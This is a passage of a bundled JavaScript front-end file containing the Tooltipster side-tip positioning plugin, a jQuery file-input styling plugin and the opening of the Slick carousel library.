            this.__$tooltip.detach(), this.__$tooltip.appendTo(t)
        }, constrain: function (t, e) {
            return this.constraints = {width: t, height: e}, this.__$tooltip.css({
                display: "block",
                height: "",
                overflow: "auto",
                width: t
            }), this
        }, destroy: function () {
            this.__$tooltip.detach().find(".tooltipster-content").css({
                display: "",
                overflow: ""
            }), this.$container.remove()
        }, free: function () {
            return this.constraints = null, this.__$tooltip.css({
                display: "",
                height: "",
                overflow: "visible",
                width: ""
            }), this
        }, measure: function () {
            this.__forceRedraw();
            var t = this.__$tooltip[0].getBoundingClientRect(),
                e = {size: {height: t.height || t.bottom - t.top, width: t.width || t.right - t.left}};
            if (this.constraints) {
                var i = this.__$tooltip.find(".tooltipster-content"), n = this.__$tooltip.outerHeight(),
                    o = i[0].getBoundingClientRect(), s = {
                        height: n <= this.constraints.height,
                        width: t.width <= this.constraints.width && o.width >= i[0].scrollWidth - 1
                    };
                e.fits = s.height && s.width
            }
            return r.IE && r.IE <= 11 && e.size.width !== r.window.document.documentElement.clientWidth && (e.size.width = Math.ceil(e.size.width) + 1), e
        }
    };
    var l = navigator.userAgent.toLowerCase();
    -1 != l.indexOf("msie") ? r.IE = parseInt(l.split("msie")[1]) : -1 !== l.toLowerCase().indexOf("trident") && -1 !== l.indexOf(" rv:11") ? r.IE = 11 : -1 != l.toLowerCase().indexOf("edge/") && (r.IE = parseInt(l.toLowerCase().split("edge/")[1]));
    var c = "tooltipster.sideTip";
    return t.tooltipster._plugin({
        name: c, instance: {
            __defaults: function () {
                return {
                    arrow: !0,
                    distance: 6,
                    functionPosition: null,
                    maxWidth: null,
                    minIntersection: 16,
                    minWidth: 0,
                    position: null,
                    side: "top",
                    viewportAware: !0
                }
            }, __init: function (t) {
                var e = this;
                e.__instance = t, e.__namespace = "tooltipster-sideTip-" + Math.round(1e6 * Math.random()), e.__previousState = "closed", e.__options, e.__optionsFormat(), e.__instance._on("state." + e.__namespace, (function (t) {
                    "closed" == t.state ? e.__close() : "appearing" == t.state && "closed" == e.__previousState && e.__create(), e.__previousState = t.state
                })), e.__instance._on("options." + e.__namespace, (function () {
                    e.__optionsFormat()
                })), e.__instance._on("reposition." + e.__namespace, (function (t) {
                    e.__reposition(t.event, t.helper)
                }))
            }, __close: function () {
                this.__instance.content() instanceof t && this.__instance.content().detach(), this.__instance._$tooltip.remove(), this.__instance._$tooltip = null
            }, __create: function () {
                var e = t('<div class="tooltipster-base tooltipster-sidetip"><div class="tooltipster-box"><div class="tooltipster-content"></div></div><div class="tooltipster-arrow"><div class="tooltipster-arrow-uncropped"><div class="tooltipster-arrow-border"></div><div class="tooltipster-arrow-background"></div></div></div></div>');
                this.__options.arrow || e.find(".tooltipster-box").css("margin", 0).end().find(".tooltipster-arrow").hide(), this.__options.minWidth && e.css("min-width", this.__options.minWidth + "px"), this.__options.maxWidth && e.css("max-width", this.__options.maxWidth + "px"), this.__instance._$tooltip = e, this.__instance._trigger("created")
            }, __destroy: function () {
                this.__instance._off("." + self.__namespace)
            }, __optionsFormat: function () {
                var e = this;
                if (e.__options = e.__instance._optionsExtract(c, e.__defaults()), e.__options.position && (e.__options.side = e.__options.position), "object" != typeof e.__options.distance && (e.__options.distance = [e.__options.distance]), e.__options.distance.length < 4 && (void 0 === e.__options.distance[1] && (e.__options.distance[1] = e.__options.distance[0]), void 0 === e.__options.distance[2] && (e.__options.distance[2] = e.__options.distance[0]), void 0 === e.__options.distance[3] && (e.__options.distance[3] = e.__options.distance[1]), e.__options.distance = {
                    top: e.__options.distance[0],
                    right: e.__options.distance[1],
                    bottom: e.__options.distance[2],
                    left: e.__options.distance[3]
                }), "string" == typeof e.__options.side) {
                    e.__options.side = [e.__options.side, {
                        top: "bottom",
                        right: "left",
                        bottom: "top",
                        left: "right"
                    }[e.__options.side]], "left" == e.__options.side[0] || "right" == e.__options.side[0] ? e.__options.side.push("top", "bottom") : e.__options.side.push("right", "left")
                }
                6 === t.tooltipster._env.IE && !0 !== e.__options.arrow && (e.__options.arrow = !1)
            }, __reposition: function (e, i) {
                var n, o = this, s = o.__targetFind(i), r = [];
                o.__instance._$tooltip.detach();
                var a = o.__instance._$tooltip.clone(), l = t.tooltipster._getRuler(a), c = !1,
                    d = o.__instance.option("animation");
                switch (d && a.removeClass("tooltipster-" + d), t.each(["window", "document"], (function (n, d) {
                    var u = null;
                    if (o.__instance._trigger({
                        container: d, helper: i, satisfied: c, takeTest: function (t) {
                            u = t
                        }, results: r, type: "positionTest"
                    }), 1 == u || 0 != u && 0 == c && ("window" != d || o.__options.viewportAware)) for (n = 0; n < o.__options.side.length; n++) {
                        var h = {horizontal: 0, vertical: 0}, p = o.__options.side[n];
                        "top" == p || "bottom" == p ? h.vertical = o.__options.distance[p] : h.horizontal = o.__options.distance[p], o.__sideChange(a, p), t.each(["natural", "constrained"], (function (t, n) {
                            if (u = null, o.__instance._trigger({
                                container: d,
                                event: e,
                                helper: i,
                                mode: n,
                                results: r,
                                satisfied: c,
                                side: p,
                                takeTest: function (t) {
                                    u = t
                                },
                                type: "positionTest"
                            }), 1 == u || 0 != u && 0 == c) {
                                var a = {
                                        container: d,
                                        distance: h,
                                        fits: null,
                                        mode: n,
                                        outerSize: null,
                                        side: p,
                                        size: null,
                                        target: s[p],
                                        whole: null
                                    },
                                    f = ("natural" == n ? l.free() : l.constrain(i.geo.available[d][p].width - h.horizontal, i.geo.available[d][p].height - h.vertical)).measure();
                                if (a.size = f.size, a.outerSize = {
                                    height: f.size.height + h.vertical,
                                    width: f.size.width + h.horizontal
                                }, "natural" == n ? i.geo.available[d][p].width >= a.outerSize.width && i.geo.available[d][p].height >= a.outerSize.height ? a.fits = !0 : a.fits = !1 : a.fits = f.fits, "window" == d && (a.fits ? a.whole = "top" == p || "bottom" == p ? i.geo.origin.windowOffset.right >= o.__options.minIntersection && i.geo.window.size.width - i.geo.origin.windowOffset.left >= o.__options.minIntersection : i.geo.origin.windowOffset.bottom >= o.__options.minIntersection && i.geo.window.size.height - i.geo.origin.windowOffset.top >= o.__options.minIntersection : a.whole = !1), r.push(a), a.whole) c = !0; else if ("natural" == a.mode && (a.fits || a.size.width <= i.geo.available[d][p].width)) return !1
                            }
                        }))
                    }
                })), o.__instance._trigger({
                    edit: function (t) {
                        r = t
                    }, event: e, helper: i, results: r, type: "positionTested"
                }), r.sort((function (t, e) {
                    if (t.whole && !e.whole) return -1;
                    if (!t.whole && e.whole) return 1;
                    if (t.whole && e.whole) {
                        var i = o.__options.side.indexOf(t.side);
                        return (n = o.__options.side.indexOf(e.side)) > i ? -1 : i > n ? 1 : "natural" == t.mode ? -1 : 1
                    }
                    if (t.fits && !e.fits) return -1;
                    if (!t.fits && e.fits) return 1;
                    if (t.fits && e.fits) {
                        var n;
                        i = o.__options.side.indexOf(t.side);
                        return (n = o.__options.side.indexOf(e.side)) > i ? -1 : i > n ? 1 : "natural" == t.mode ? -1 : 1
                    }
                    return "document" == t.container && "bottom" == t.side && "natural" == t.mode ? -1 : 1
                })), (n = r[0]).coord = {}, n.side) {
                    case"left":
                    case"right":
                        n.coord.top = Math.floor(n.target - n.size.height / 2);
                        break;
                    case"bottom":
                    case"top":
                        n.coord.left = Math.floor(n.target - n.size.width / 2)
                }
                switch (n.side) {
                    case"left":
                        n.coord.left = i.geo.origin.windowOffset.left - n.outerSize.width;
                        break;
                    case"right":
                        n.coord.left = i.geo.origin.windowOffset.right + n.distance.horizontal;
                        break;
                    case"top":
                        n.coord.top = i.geo.origin.windowOffset.top - n.outerSize.height;
                        break;
                    case"bottom":
                        n.coord.top = i.geo.origin.windowOffset.bottom + n.distance.vertical
                }
                "window" == n.container ? "top" == n.side || "bottom" == n.side ? n.coord.left < 0 ? i.geo.origin.windowOffset.right - this.__options.minIntersection >= 0 ? n.coord.left = 0 : n.coord.left = i.geo.origin.windowOffset.right - this.__options.minIntersection - 1 : n.coord.left > i.geo.window.size.width - n.size.width && (i.geo.origin.windowOffset.left + this.__options.minIntersection <= i.geo.window.size.width ? n.coord.left = i.geo.window.size.width - n.size.width : n.coord.left = i.geo.origin.windowOffset.left + this.__options.minIntersection + 1 - n.size.width) : n.coord.top < 0 ? i.geo.origin.windowOffset.bottom - this.__options.minIntersection >= 0 ? n.coord.top = 0 : n.coord.top = i.geo.origin.windowOffset.bottom - this.__options.minIntersection - 1 : n.coord.top > i.geo.window.size.height - n.size.height && (i.geo.origin.windowOffset.top + this.__options.minIntersection <= i.geo.window.size.height ? n.coord.top = i.geo.window.size.height - n.size.height : n.coord.top = i.geo.origin.windowOffset.top + this.__options.minIntersection + 1 - n.size.height) : (n.coord.left > i.geo.window.size.width - n.size.width && (n.coord.left = i.geo.window.size.width - n.size.width), n.coord.left < 0 && (n.coord.left = 0)), o.__sideChange(a, n.side), i.tooltipClone = a[0], i.tooltipParent = o.__instance.option("parent").parent[0], i.mode = n.mode, i.whole = n.whole, i.origin = o.__instance._$origin[0], i.tooltip = o.__instance._$tooltip[0], delete n.container, delete n.fits, delete n.mode, delete n.outerSize, delete n.whole, n.distance = n.distance.horizontal || n.distance.vertical;
                var u, h, p, f = t.extend(!0, {}, n);
                if (o.__instance._trigger({
                    edit: function (t) {
                        n = t
                    }, event: e, helper: i, position: f, type: "position"
                }), o.__options.functionPosition) {
                    var g = o.__options.functionPosition.call(o, o.__instance, i, f);
                    g && (n = g)
                }
                l.destroy(), "top" == n.side || "bottom" == n.side ? (u = {
                    prop: "left",
                    val: n.target - n.coord.left
                }, h = n.size.width - this.__options.minIntersection) : (u = {
                    prop: "top",
                    val: n.target - n.coord.top
                }, h = n.size.height - this.__options.minIntersection), u.val < this.__options.minIntersection ? u.val = this.__options.minIntersection : u.val > h && (u.val = h), p = i.geo.origin.fixedLineage ? i.geo.origin.windowOffset : {
                    left: i.geo.origin.windowOffset.left + i.geo.window.scroll.left,
                    top: i.geo.origin.windowOffset.top + i.geo.window.scroll.top
                }, n.coord = {
                    left: p.left + (n.coord.left - i.geo.origin.windowOffset.left),
                    top: p.top + (n.coord.top - i.geo.origin.windowOffset.top)
                }, o.__sideChange(o.__instance._$tooltip, n.side), i.geo.origin.fixedLineage ? o.__instance._$tooltip.css("position", "fixed") : o.__instance._$tooltip.css("position", ""), o.__instance._$tooltip.css({
                    left: n.coord.left,
                    top: n.coord.top,
                    height: n.size.height,
                    width: n.size.width
                }).find(".tooltipster-arrow").css({
                    left: "",
                    top: ""
                }).css(u.prop, u.val), o.__instance._$tooltip.appendTo(o.__instance.option("parent")), o.__instance._trigger({
                    type: "repositioned",
                    event: e,
                    position: n
                })
            }, __sideChange: function (t, e) {
                t.removeClass("tooltipster-bottom").removeClass("tooltipster-left").removeClass("tooltipster-right").removeClass("tooltipster-top").addClass("tooltipster-" + e)
            }, __targetFind: function (t) {
                var e = {}, i = this.__instance._$origin[0].getClientRects();
                i.length > 1 && (1 == this.__instance._$origin.css("opacity") && (this.__instance._$origin.css("opacity", .99), i = this.__instance._$origin[0].getClientRects(), this.__instance._$origin.css("opacity", 1)));
                if (i.length < 2) e.top = Math.floor(t.geo.origin.windowOffset.left + t.geo.origin.size.width / 2), e.bottom = e.top, e.left = Math.floor(t.geo.origin.windowOffset.top + t.geo.origin.size.height / 2), e.right = e.left; else {
                    var n = i[0];
                    e.top = Math.floor(n.left + (n.right - n.left) / 2), n = i.length > 2 ? i[Math.ceil(i.length / 2) - 1] : i[0], e.right = Math.floor(n.top + (n.bottom - n.top) / 2), n = i[i.length - 1], e.bottom = Math.floor(n.left + (n.right - n.left) / 2), n = i.length > 2 ? i[Math.ceil((i.length + 1) / 2) - 1] : i[i.length - 1], e.left = Math.floor(n.top + (n.bottom - n.top) / 2)
                }
                return e
            }
        }
    }), t
})), function (t) {
    "use strict";
    t.fn.fileinput = function (e) {
        function i(t) {
            function e(t, e) {
                return e.toUpper()
            }

            var i = {}, n = t.data();
            for (var o in n) if (n.hasOwnProperty(o)) {
                var s = n[o];
                "yes" === s || "y" === s ? s = !0 : "no" !== s && "n" !== s || (s = !1), i[o.replace(/-(\w)/g, e)] = s
            }
            return i
        }

        e = t.extend({
            title: "Browse...",
            multipleText: "{0} files",
            showMultipleNames: !1,
            buttonClass: "btn btn-default",
            selectedClass: "file-selected",
            clearButton: '<button type="button" class="fileinput-clear close">&times;</button>',
            complete: function () {
            }
        }, e || {}), this.each((function (n, o) {
            var s = t(o), r = t.extend(!0, e, i(s));
            if (void 0 === s.attr("data-fileinput-disabled")) {
                var a = r.title;
                s.attr("title") && (a = s.attr("title"));
                var l = r.buttonClass;
                s.attr("class") && (l = s.attr("class")), s.wrap('<span class="' + t.trim("fileinput " + l) + '"></span>'), s.closest(".fileinput").prepend(t("<span></span>").html(a)), s.closest(".fileinput").wrap(t('<span class="fileinput-wrapper"></span>')), "function" == typeof r.complete && r.complete.call(this)
            }
        })).promise().done((function () {
            t(document).on("change", ".fileinput input[type=file]", (function () {
                var n = t(this), o = n.closest(".fileinput-wrapper"), s = n.val(), r = t.extend(!0, e, i(n));
                if (o.removeClass(r.selectedClass).find(".fileinput-name").remove(), n.prop("files") && n.prop("files").length > 1) if (r.showMultipleNames) {
                    for (var a = [], l = 0, c = n[0].files.length; l < c; l++) a.push(n[0].files[l].name);
                    s = a.join(", ")
                } else s = r.multipleText.replace("{0}", n[0].files.length); else s = s.substring(s.lastIndexOf("\\") + 1, s.length);
                s && o.addClass(r.selectedClass).append('<span class="fileinput-name">' + s + r.clearButton + "</span>")
            })), t(document).on("click", ".fileinput-clear", (function (n) {
                n.preventDefault();
                var o = t(this).closest(".fileinput-wrapper"), s = o.find("input[type=file]"),
                    r = t.extend(!0, e, i(s));
                s.replaceWith(s.val("").clone(!0)), o.find(".fileinput-name").remove(), o.find("input").trigger("change"), o.removeClass(r.selectedClass)
            }))
        }))
    }
}(jQuery), function (t) {
    "use strict";
    "function" == typeof define && define.amd ? define(["jquery"], t) : "undefined" != typeof exports ? module.exports = t(require("jquery")) : t(jQuery)
}((function (t) {
    "use strict";
    var e = window.Slick || {};
    (e = function () {
        var e = 0;
        return function (i, n) {
            var o, s = this;
            s.defaults = {
                accessibility: !0,
                adaptiveHeight: !1,
                appendArrows: t(i),
                appendDots: t(i),
                arrows: !0,
                asNavFor: null,
                prevArrow: '<button type="button" data-role="none" class="slick-prev" aria-label="Previous" tabindex="0" role="button">Previous</button>',
                nextArrow: '<button type="button" data-role="none" class="slick-next" aria-label="Next" tabindex="0" role="button">Next</button>',
                autoplay: !1,
                autoplaySpeed: 3e3,
                centerMode: !1,
                centerPadding: "50px",
                cssEase: "ease",
                customPaging: function (t, e) {
                    return '<button type="button" data-role="none" role="button" aria-required="false" tabindex="0">' + (e + 1) + "</button>"
                },
                dots: !1,
                dotsClass: "slick-dots",
                draggable: !0,
                easing: "linear",
                edgeFriction: .35,
                fade: !1,
                focusOnSelect: !1,
                infinite: !0,
                initialSlide: 0,
                lazyLoad: "ondemand",
                mobileFirst: !1,
                pauseOnHover: !0,
                pauseOnDotsHover: !1,
                respondTo: "window",
                responsive: null,
                rows: 1,
                rtl: !1,
                slide: "",
                slidesPerRow: 1,
                slidesToShow: 1,
                slidesToScroll: 1,
                speed: 500,
                swipe: !0,
                swipeToSlide: !1,
                touchMove: !0,
                touchThreshold: 5,
                useCSS: !0,
                useTransform: !1,
                variableWidth: !1,
                vertical: !1,
                verticalSwiping: !1,
                waitForAnimate: !0,
                zIndex: 1e3
            }, s.initials = {
                animating: !1,
                dragging: !1,
                autoPlayTimer: null,
                currentDirection: 0,
                currentLeft: null,
                currentSlide: 0,
                direction: 1,
                $dots: null,
                listWidth: null,
                listHeight: null,
                loadIndex: 0,
                $nextArrow: null,
                $prevArrow: null,
                slideCount: null,
                slideWidth: null,
                $slideTrack: null,
                $slides: null,
                sliding: !1,
                slideOffset: 0,
                swipeLeft: null,
                $list: null,
                touchObject: {},
                transformsEnabled: !1,
                unslicked: !1
            }, t.extend(s, s.initials), s.activeBreakpoint = null, s.animType = null, s.animProp = null, s.breakpoints = [], s.breakpointSettings = [], s.cssTransitions = !1, s.hidden = "hidden", s.paused = !1, s.positionProp = null, s.respondTo = null, s.rowCount = 1, s.shouldClick = !0, s.$slider = t(i), s.$slidesCache = null, s.transformType = null, s.transitionType = null, s.visibilityChange = "visibilitychange", s.windowWidth = 0, s.windowTimer = null, o = t(i).data("slick") || {}, s.options = t.extend({}, s.defaults, o, n), s.currentSlide = s.options.initialSlide, s.originalSettings = s.options, void 0 !== document.mozHidden ? (s.hidden = "mozHidden", s.visibilityChange = "mozvisibilitychange") : void 0 !== document.webkitHidden && (s.hidden = "webkitHidden", s.visibilityChange = "webkitvisibilitychange"), s.autoPlay = t.proxy(s.autoPlay, s), s.autoPlayClear = t.proxy(s.autoPlayClear, s), s.changeSlide = t.proxy(s.changeSlide, s), s.clickHandler = t.proxy(s.clickHandler, s), s.selectHandler = t.proxy(s.selectHandler, s), s.setPosition = t.proxy(s.setPosition, s), s.swipeHandler = t.proxy(s.swipeHandler, s), s.dragHandler = t.proxy(s.dragHandler, s), s.keyHandler = t.proxy(s.keyHandler, s), s.autoPlayIterator = t.proxy(s.autoPlayIterator, s), s.instanceUid = e++, s.htmlExpr = /^(?:\s*(<[\w\W]+>)[^>]*)$/, s.registerBreakpoints(), s.init(!0), s.checkResponsive(!0)
        }
    }()).prototype.addSlide = e.prototype.slickAdd = function (e, i, n) {
        var o = this;
        if ("boolean" == typeof i) n = i, i = null; else if (0 > i || i >= o.slideCount) return !1;
        o.unload(), "number" == typeof i ? 0 === i && 0 === o.$slides.length ? t(e).appendTo(o.$slideTrack) : n ? t(e).insertBefore(o.$slides.eq(i)) : t(e).insertAfter(o.$slides.eq(i)) : !0 === n ? t(e).prependTo(o.$slideTrack) : t(e).appendTo(o.$slideTrack), o.$slides = o.$slideTrack.children(this.options.slide), o.$slideTrack.children(this.options.slide).detach(), o.$slideTrack.append(o.$slides), o.$slides.each((function (e, i) {
            t(i).attr("data-slick-index", e)
        })), o.$slidesCache = o.$slides, o.reinit()
    }, e.prototype.animateHeight = function () {
        var t = this;
        if (1 === t.options.slidesToShow && !0 === t.options.adaptiveHeight && !1 === t.options.vertical) {
            var e = t.$slides.eq(t.currentSlide).outerHeight(!0);
            t.$list.animate({height: e}, t.options.speed)
        }
    }, e.prototype.animateSlide = function (e, i) {
        var n = {}, o = this;
        o.animateHeight(), !0 === o.options.rtl && !1 === o.options.vertical && (e = -e), !1 === o.transformsEnabled ? !1 === o.options.vertical ? o.$slideTrack.animate({left: e}, o.options.speed, o.options.easing, i) : o.$slideTrack.animate({top: e}, o.options.speed, o.options.easing, i) : !1 === o.cssTransitions ? (!0 === o.options.rtl && (o.currentLeft = -o.currentLeft), t({animStart: o.currentLeft}).animate({animStart: e}, {
            duration: o.options.speed,
            easing: o.options.easing,
            step: function (t) {
                t = Math.ceil(t), !1 === o.options.vertical ? (n[o.animType] = "translate(" + t + "px, 0px)", o.$slideTrack.css(n)) : (n[o.animType] = "translate(0px," + t + "px)", o.$slideTrack.css(n))
            },
            complete: function () {
                i && i.call()
            }
        })) : (o.applyTransition(), e = Math.ceil(e), !1 === o.options.vertical ? n[o.animType] = "translate3d(" + e + "px, 0px, 0px)" : n[o.animType] = "translate3d(0px," + e + "px, 0px)", o.$slideTrack.css(n), i && setTimeout((function () {
            o.disableTransition(), i.call()
        }), o.options.speed))
    }, e.prototype.asNavFor = function (e) {
        var i = this.options.asNavFor;
        i && null !== i && (i = t(i).not(this.$slider)), null !== i && "object" == typeof i && i.each((function () {
            var i = t(this).slick("getSlick");
            i.unslicked || i.slideHandler(e, !0)
        }))
    }, e.prototype.applyTransition = function (t) {
        var e = this, i = {};
        !1 === e.options.fade ? i[e.transitionType] = e.transformType + " " + e.options.speed + "ms " + e.options.cssEase : i[e.transitionType] = "opacity " + e.options.speed + "ms " + e.options.cssEase, !1 === e.options.fade ? e.$slideTrack.css(i) : e.$slides.eq(t).css(i)
    }, e.prototype.autoPlay = function () {
        var t = this;
        t.autoPlayTimer && clearInterval(t.autoPlayTimer), t.slideCount > t.options.slidesToShow && !0 !== t.paused && (t.autoPlayTimer = setInterval(t.autoPlayIterator, t.options.autoplaySpeed))
    }, e.prototype.autoPlayClear = function () {
        this.autoPlayTimer && clearInterval(this.autoPlayTimer)
    }, e.prototype.autoPlayIterator = function () {
        var t = this;
        !1 === t.options.infinite ? 1 === t.direction ? (t.currentSlide + 1 === t.slideCount - 1 && (t.direction = 0), t.slideHandler(t.currentSlide + t.options.slidesToScroll)) : (t.currentSlide - 1 == 0 && (t.direction = 1), t.slideHandler(t.currentSlide - t.options.slidesToScroll)) : t.slideHandler(t.currentSlide + t.options.slidesToScroll)
    }, e.prototype.buildArrows = function () {
        var e = this;
        !0 === e.options.arrows && (e.$prevArrow = t(e.options.prevArrow).addClass("slick-arrow"), e.$nextArrow = t(e.options.nextArrow).addClass("slick-arrow"), e.slideCount > e.options.slidesToShow ? (e.$prevArrow.removeClass("slick-hidden").removeAttr("aria-hidden tabindex"), e.$nextArrow.removeClass("slick-hidden").removeAttr("aria-hidden tabindex"), e.htmlExpr.test(e.options.prevArrow) && e.$prevArrow.prependTo(e.options.appendArrows), e.htmlExpr.test(e.options.nextArrow) && e.$nextArrow.appendTo(e.options.appendArrows), !0 !== e.options.infinite && e.$prevArrow.addClass("slick-disabled").attr("aria-disabled", "true")) : e.$prevArrow.add(e.$nextArrow).addClass("slick-hidden").attr({
            "aria-disabled": "true",
            tabindex: "-1"
        }))
    }, e.prototype.buildDots = function () {
        var e, i, n = this;
        if (!0 === n.options.dots && n.slideCount > n.options.slidesToShow) {
            for (i = '<ul class="' + n.options.dotsClass + '">', e = 0; e <= n.getDotCount(); e += 1) i += "<li>" + n.options.customPaging.call(this, n, e) + "</li>";
            i += "</ul>", n.$dots = t(i).appendTo(n.options.appendDots), n.$dots.find("li").first().addClass("slick-active").attr("aria-hidden", "false")
        }
    }, e.prototype.buildOut = function () {
        var e = this;
        e.$slides = e.$slider.children(e.options.slide + ":not(.slick-cloned)").addClass("slick-slide"), e.slideCount = e.$slides.length, e.$slides.each((function (e, i) {
            t(i).attr("data-slick-index", e).data("originalStyling", t(i).attr("style") || "")
        })), e.$slider.addClass("slick-slider"), e.$slideTrack = 0 === e.slideCount ? t('<div class="slick-track"/>').appendTo(e.$slider) : e.$slides.wrapAll('<div class="slick-track"/>').parent(), e.$list = e.$slideTrack.wrap('<div aria-live="polite" class="slick-list"/>').parent(), e.$slideTrack.css("opacity", 0), (!0 === e.options.centerMode || !0 === e.options.swipeToSlide) && (e.options.slidesToScroll = 1), t("img[data-lazy]", e.$slider).not("[src]").addClass("slick-loading"), e.setupInfinite(), e.buildArrows(), e.buildDots(), e.updateDots(), e.setSlideClasses("number" == typeof e.currentSlide ? e.currentSlide : 0), !0 === e.options.draggable && e.$list.addClass("draggable")
    }, e.prototype.buildRows = function () {
        var t, e, i, n, o, s, r, a = this;
        if (n = document.createDocumentFragment(), s = a.$slider.children(), a.options.rows > 1) {
            for (r = a.options.slidesPerRow * a.options.rows, o = Math.ceil(s.length / r), t = 0; o > t; t++) {
                var l = document.createElement("div");
                for (e = 0; e < a.options.rows; e++) {
                    var c = document.createElement("div");
                    for (i = 0; i < a.options.slidesPerRow; i++) {
                        var d = t * r + (e * a.options.slidesPerRow + i);
                        s.get(d) && c.appendChild(s.get(d))
                    }
                    l.appendChild(c)
                }
                n.appendChild(l)
            }
            a.$slider.html(n), a.$slider.children().children().children().css({
                width: 100 / a.options.slidesPerRow + "%",
                display: "inline-block"
            })
        }
    }, e.prototype.checkResponsive = function (e, i) {
        var n, o, s, r = this, a = !1, l = r.$slider.width(), c = window.innerWidth || t(window).width();
        if ("window" === r.respondTo ? s = c : "slider" === r.respondTo ? s = l : "min" === r.respondTo && (s = Math.min(c, l)), r.options.responsive && r.options.responsive.length && null !== r.options.responsive) {
            for (n in o = null, r.breakpoints) r.breakpoints.hasOwnProperty(n) && (!1 === r.originalSettings.mobileFirst ? s < r.breakpoints[n] && (o = r.breakpoints[n]) : s > r.breakpoints[n] && (o = r.breakpoints[n]));
            null !== o ? null !== r.activeBreakpoint ? (o !== r.activeBreakpoint || i) && (r.activeBreakpoint = o, "unslick" === r.breakpointSettings[o] ? r.unslick(o) : (r.options = t.extend({}, r.originalSettings, r.breakpointSettings[o]), !0 === e && (r.currentSlide = r.options.initialSlide), r.refresh(e)), a = o) : (r.activeBreakpoint = o, "unslick" === r.breakpointSettings[o] ? r.unslick(o) : (r.options = t.extend({}, r.originalSettings, r.breakpointSettings[o]), !0 === e && (r.currentSlide = r.options.initialSlide), r.refresh(e)), a = o) : null !== r.activeBreakpoint && (r.activeBreakpoint = null, r.options = r.originalSettings, !0 === e && (r.currentSlide = r.options.initialSlide), r.refresh(e), a = o), e || !1 === a || r.$slider.trigger("breakpoint", [r, a])
        }
    }, e.prototype.changeSlide = function (e, i) {
        var n, o, s = this, r = t(e.target);
        switch (r.is("a") && e.preventDefault(), r.is("li") || (r = r.closest("li")), n = s.slideCount % s.options.slidesToScroll != 0 ? 0 : (s.slideCount - s.currentSlide) % s.options.slidesToScroll, e.data.message) {
            case"previous":
                o = 0 === n ? s.options.slidesToScroll : s.options.slidesToShow - n, s.slideCount > s.options.slidesToShow && s.slideHandler(s.currentSlide - o, !1, i);
                break;
            case"next":
                o = 0 === n ? s.options.slidesToScroll : n, s.slideCount > s.options.slidesToShow && s.slideHandler(s.currentSlide + o, !1, i);
                break;
            case"index":
                var a = 0 === e.data.index ? 0 : e.data.index || r.index() * s.options.slidesToScroll;
                s.slideHandler(s.checkNavigable(a), !1, i), r.children().trigger("focus");
                break;
            default:
                return
        }
    }, e.prototype.checkNavigable = function (t) {
        var e, i;
        if (i = 0, t > (e = this.getNavigableIndexes())[e.length - 1]) t = e[e.length - 1]; else for (var n in e) {
            if (t < e[n]) {
                t = i;
                break
            }
            i = e[n]
        }
        return t
    }, e.prototype.cleanUpEvents = function () {
        var e = this;
        e.options.dots && null !== e.$dots && (t("li", e.$dots).off("click.slick", e.changeSlide), !0 === e.options.pauseOnDotsHover && !0 === e.options.autoplay && t("li", e.$dots).off("mouseenter.slick", t.proxy(e.setPaused, e, !0)).off("mouseleave.slick", t.proxy(e.setPaused, e, !1))), !0 === e.options.arrows && e.slideCount > e.options.slidesToShow && (e.$prevArrow && e.$prevArrow.off("click.slick", e.changeSlide), e.$nextArrow && e.$nextArrow.off("click.slick", e.changeSlide)), e.$list.off("touchstart.slick mousedown.slick", e.swipeHandler), e.$list.off("touchmove.slick mousemove.slick", e.swipeHandler), e.$list.off("touchend.slick mouseup.slick", e.swipeHandler), e.$list.off("touchcancel.slick mouseleave.slick", e.swipeHandler), e.$list.off("click.slick", e.clickHandler), t(document).off(e.visibilityChange, e.visibility), e.$list.off("mouseenter.slick", t.proxy(e.setPaused, e, !0)), e.$list.off("mouseleave.slick", t.proxy(e.setPaused, e, !1)), !0 === e.options.accessibility && e.$list.off("keydown.slick", e.keyHandler), !0 === e.options.focusOnSelect && t(e.$slideTrack).children().off("click.slick", e.selectHandler), t(window).off("orientationchange.slick.slick-" + e.instanceUid, e.orientationChange), t(window).off("resize.slick.slick-" + e.instanceUid, e.resize), t("[draggable!=true]", e.$slideTrack).off("dragstart", e.preventDefault), t(window).off("load.slick.slick-" + e.instanceUid, e.setPosition), t(document).off("ready.slick.slick-" + e.instanceUid, e.setPosition)
    }, e.prototype.cleanUpRows = function () {
        var t, e = this;
        e.options.rows > 1 && ((t = e.$slides.children().children()).removeAttr("style"), e.$slider.html(t))
    }, e.prototype.clickHandler = function (t) {
        !1 === this.shouldClick && (t.stopImmediatePropagation(), t.stopPropagation(), t.preventDefault())
    }, e.prototype.destroy = function (e) {
        var i = this;
        i.autoPlayClear(), i.touchObject = {}, i.cleanUpEvents(), t(".slick-cloned", i.$slider).detach(), i.$dots && i.$dots.remove(), i.$prevArrow && i.$prevArrow.length && (i.$prevArrow.removeClass("slick-disabled slick-arrow slick-hidden").removeAttr("aria-hidden aria-disabled tabindex").css("display", ""), i.htmlExpr.test(i.options.prevArrow) && i.$prevArrow.remove()), i.$nextArrow && i.$nextArrow.length && (i.$nextArrow.removeClass("slick-disabled slick-arrow slick-hidden").removeAttr("aria-hidden aria-disabled tabindex").css("display", ""), i.htmlExpr.test(i.options.nextArrow) && i.$nextArrow.remove()), i.$slides && (i.$slides.removeClass("slick-slide slick-active slick-center slick-visible slick-current").removeAttr("aria-hidden").removeAttr("data-slick-index").each((function () {
            t(this).attr("style", t(this).data("originalStyling"))
        })), i.$slideTrack.children(this.options.slide).detach(), i.$slideTrack.detach(), i.$list.detach(), i.$slider.append(i.$slides)), i.cleanUpRows(), i.$slider.removeClass("slick-slider"), i.$slider.removeClass("slick-initialized"), i.unslicked = !0, e || i.$slider.trigger("destroy", [i])
    }, e.prototype.disableTransition = function (t) {
        var e = this, i = {};
        i[e.transitionType] = "", !1 === e.options.fade ? e.$slideTrack.css(i) : e.$slides.eq(t).css(i)
    }, e.prototype.fadeSlide = function (t, e) {
        var i = this;
        !1 === i.cssTransitions ? (i.$slides.eq(t).css({zIndex: i.options.zIndex}), i.$slides.eq(t).animate({opacity: 1}, i.options.speed, i.options.easing, e)) : (i.applyTransition(t), i.$slides.eq(t).css({
            opacity: 1,
            zIndex: i.options.zIndex
        }), e && setTimeout((function () {
            i.disableTransition(t), e.call()
        }), i.options.speed))
    }, e.prototype.fadeSlideOut = function (t) {
        var e = this;
        !1 === e.cssTransitions ? e.$slides.eq(t).animate({
            opacity: 0,
            zIndex: e.options.zIndex - 2
        }, e.options.speed, e.options.easing) : (e.applyTransition(t), e.$slides.eq(t).css({
            opacity: 0,
            zIndex: e.options.zIndex - 2
        }))
